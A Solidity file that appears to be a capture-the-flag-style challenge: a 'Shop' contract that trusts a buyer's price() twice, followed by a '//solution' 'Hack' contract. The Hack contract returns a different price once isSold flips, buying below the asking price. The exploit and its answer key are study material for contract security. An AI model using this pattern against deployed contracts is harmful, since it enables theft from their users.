
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}





//solution
pragma solidity ^0.8.0;

interface IShop {
    function buy() external;
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
}

contract Hack {
    IShop private immutable target;

    constructor(address _target) {
        target = IShop(_target);
    }

    function pwn() external {
        target.buy();
        require(target.price() == 99, "price != 99");
    }

    function price() external view returns (uint256) {
        if (target.isSold()) {
            return 99;
        }
        return 100;
    }
}
